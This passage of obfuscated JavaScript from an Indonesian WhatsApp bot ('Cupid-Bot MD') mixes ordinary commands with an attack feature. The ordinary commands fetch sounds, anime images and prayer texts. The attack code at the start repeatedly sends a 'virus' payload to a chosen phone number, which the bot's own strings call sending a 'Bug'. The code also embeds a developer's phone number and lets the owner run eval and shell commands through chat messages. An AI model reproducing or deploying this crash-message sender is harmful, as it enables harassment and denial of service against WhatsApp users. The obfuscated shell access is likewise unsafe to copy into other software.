sleep(-0x2*0x1228+0x1208+0x1e00),zeroyt7[_0x18077f(0xf7)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(0x5*0xd5+0x86d+0x25*-0x6),zeroyt7[_0x18077f(0xf7)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(0x1bfd+-0x906+-0x73f),zeroyt7[_0x18077f(0xf7)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(-0x321+-0x176*-0x19+-0x15ad),zeroyt7[_0x18077f(0xf7)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(0x4*-0x68e+0x1fe*-0x5+0x2fe6),zeroyt7[_0x18077f(0xf7)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(0x33*-0x61+0x1587+0xae*0xe),reply(_0x18077f(0x110)+_0x18077f(0x104)+command+_0x18077f(0x10d)+num[_0x18077f(0x100)]('@')[-0x2cf+0x8b0+-0x5e1],[num]);function _0x572f(){var _0x4aaf1b=['8OzNnyt','944eyYkRs','3751998nbCCcT','sendMessag','56726GlylrC','Masukan\x20No','itu\x20nomor\x20','im\x20Bug\x20!\x0a*','mer\x20Hp\x20Yg\x20','p.net','Itu\x20develo','sapp.net','split','@s.whatsap','15507BOdyZj','Mau\x20Di\x20Kir','im\x20*','11BJPRBs','per\x20gua','2030403HvIZYd','19441056tugLCL','840@s.what','owner','7CoeETS','6281548926','*\x20to\x20@','22FsVMTy','lu\x20sendiri','Sukses\x20kir','1939800Zocacp','\x20628xxx','Contoh:\x20','924965vPIGdj'];_0x572f=function(){return _0x4aaf1b;};return _0x572f();}
}
break
case 'sound1':case 'sound2':
case 'sound3':case 'sound4':case 'sound5':case 'sound6':
case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':
case 'sound15':case 'sound16':case 'sound17':case 'sound18':
case 'sound19':case 'sound20':case 'sound21':case 'sound22':
case 'sound23':case 'sound24':case 'sound25':case 'sound26':
case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':
case 'sound35':case 'sound36':case 'sound37':case 'sound38':
case 'sound39':case 'sound40':case 'sound41':case 'sound42':
case 'sound43':case 'sound44':case 'sound45':case 'sound46':
case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':
case 'sound55':case 'sound56':case 'sound57':case 'sound58':
case 'sound59':case 'sound60':case 'sound61':case 'sound62':
case 'sound63':case 'sound64':case 'sound65':case 'sound66':
case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74': {
reply(mess.wait)
var inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
zeroyt7.sendMessage(from, {audio:inicdd, mimetype:'audio/mpeg', ptt:true}, {quoted:fkontak})
}
break
case 'waifu':case 'lick':case 'kiss':case 'awoo':
case 'hug':case 'cry':case 'cuddle':case 'bully':
case 'megumin':case 'shinobu':case 'neko':case 'slap':
case 'wink':case 'dance':case 'poke':case 'glomp':
case 'bite':case 'nom':case 'handhold':case 'highfive':
case 'wave':case 'smile':case 'yeet':case 'bonk':
case 'smug':case 'pat':
reply(mess.wait)
fetchJson(`https://api.waifu.pics/sfw/${command}`).then(x => {
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '𝗡𝗘𝗫𝗧'}, type: 1},
]
let buttonMessage = {
image: {url:x.url},
caption: `Created by Cupid-Bot MD`,
footer: ``,
buttons: buttons,
headerType: 4
}
zeroyt7.sendMessage(from, buttonMessage, {mentions:[sender]},{quoted:fkontak})})
break
case 'kisahnabi': {
var api = await fetchJson(`https://api.kirbotz.my.id/api/kisahnabi?nabi=${q}&apikey=KirBotz`)
var res = api.result
txt = `Nama : ${res.name}
Kelahiran : ${res.kelahiran}
Wafat Usia : ${res.wafat_usia}
Singgah : ${res.singgah}
Kisah : ${res.kisah}`
}
zeroyt7.sendText(from, txt, fkontak)
break
case 'niatsholat': {
var api = await fetchJson(`https://api.kirbotz.my.id/api/niatsholat?yah=${q}&apikey=KirBotz`)
var res = api.result
txt = `Nama : ${res.name}
Arabic : ${res.arabic}
Latin : ${res.latin}
Terjemah : ${res.terjemahan}`
}
zeroyt7.sendText(from, txt, fkontak)
break
case 'asmaulhusna': {
var api = await fetchJson(`https://api.kirbotz.my.id/api/asmaulhusna?apikey=KirBotz`)
var res = api.result
txt = `Nomor : ${res.nomor}
Latin : ${res.latin}
Arabic : ${res.arabic}
Terjemah Indonesia : ${res.id}
Terjemah Inggris : ${res.en}`
}
zeroyt7.sendText(from, txt, fkontak)
break
case 'doaharian': {
var api = await fetchJson(`https://api.kirbotz.my.id/api/doaharian?apikey=KirBotz`)
var res = api.result
txt = `Nomor : ${res.nomor}
Title : ${res.title}
Arabic : ${res.arabic}
Latin : ${res.latin}
Translate : ${res.translate}`
}
zeroyt7.sendText(from, txt, fkontak)
break
case 'bacaansholat': {
var api = await fetchJson(`https://api.kirbotz.my.id/api/bacaansholat?apikey=KirBotz`)
var res = api.result
txt = `Nomor : ${res.nomor}
Name : ${res.name}
Arabic : ${res.arabic}
Latin : ${res.arabic}
Terjemah : ${res.terjemahan}`
}
zeroyt7.sendText(from, txt, fkontak)
break
case 'style': case 'styletext': {
if (!isOwner) return reply(mess.owner)
if (!quoted) return reply(`Masukkan Textnya Juga!`)
// if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
// db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('../message/scrape/scraper')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
    teks += `📍${i.name} : ${i.result}\n\n`
}
m.reply(teks)
}
break
// ━━━━━━━━━━━━━[ AKHIRAN ]━━━━━━━━━━━━━━━━━//

default:
if (budy.startsWith('=>')) {
if (!isOwner) return reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isOwner) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isOwner) return reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
	
if (from.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}
	
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
zeroyt7.copyNForward(from, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
zeroyt7.sendMessage(m.key.remoteJid, { text: `*[ERROR !!!]*\n${err}` }, { quoted: m })
}
}

const _0x4fb9e4=_0x1df3;(function(_0x2b13ba,_0x5a20ca){const _0x7e97f5=_0x1df3,_0x3c41da=_0x2b13ba();while(!![]){try{const _0x354a4f=parseInt(_0x7e97f5(0x1c5))/(0xbc*0x2+-0x1c1f*-0x1+0xecb*-0x2)*(parseInt(_0x7e97f5(0x1b4))/(-0x10d*0x9+0x58d+0x3ea))+parseInt(_0x7e97f5(0x1b5))/(-0xe2b+0x1*0x1e28+-0xffa)*(parseInt(_0x7e97f5(0x1b9))/(-0xd*-0x296+0x1d07+0x1*-0x3ea1))+parseInt(_0x7e97f5(0x1b8))/(-0x578+0x28f*0x1+0xa*0x4b)+-parseInt(_0x7e97f5(0x1c4))/(-0x13d*0xb+0x12c8+0x107*-0x5)+-parseInt(_0x7e97f5(0x1b6))/(-0x47*0x7+0x213f+-0x1f47)+-parseInt(_0x7e97f5(0x1ba))/(0x23ed+-0x14*0x1e1+0x1af)*(-parseInt(_0x7e97f5(0x1bb))/(-0xe*0x179+0x2f*-0x9a+-0xf*-0x343))+parseInt(_0x7e97f5(0x1bf))/(0x119*0x1a+0x881*0x1+-0x2501);if(_0x354a4f===_0x5a20ca)break;else _0x3c41da['push'](_0x3c41da['shift']());}catch(_0x4013bd){_0x3c41da['push'](_0x3c41da['shift']());}}}(_0x1d7b,0x1cd4c+-0x63814+0xce34f));let file=require[_0x4fb9e4(0x1b7)](__filename);function _0x1df3(_0x572077,_0x2c319e){const _0x250692=_0x1d7b();return _0x1df3=function(_0x5978d8,_0x549f71){_0x5978d8=_0x5978d8-(-0x26fb+0x12df+0x15cf);let _0x212a3f=_0x250692[_0x5978d8];return _0x212a3f;},_0x1df3(_0x572077,_0x2c319e);}fs[_0x4fb9e4(0x1c0)](file,()=>{const _0x55f274=_0x4fb9e4,_0x364522={'DyBxh':function(_0x1ea4e8,_0x94c63d){return _0x1ea4e8(_0x94c63d);}};fs[_0x55f274(0x1be)+'e'](file),console[_0x55f274(0x1c3)](chalk[_0x55f274(0x1c2)](__filename+(_0x55f274(0x1bd)+_0x55f274(0x1c1)))),delete require[_0x55f274(0x1bc)][file],_0x364522[_0x55f274(0x1b3)](require,file);});function _0x1d7b(){const _0x7d86c=['watchFile','Update','blue','log','4363284XOEpZH','36451WENywJ','DyBxh','6czktnP','3KNIwVE','3516114PwMPzd','resolve','3315695OKHlvH','2250520NQbHbK','808ZNgqbp','35298gvMXAj','cache','\x20Telah\x20Di\x20','unwatchFil','534150hWYltP'];_0x1d7b=function(){return _0x7d86c;};return _0x1d7b();}
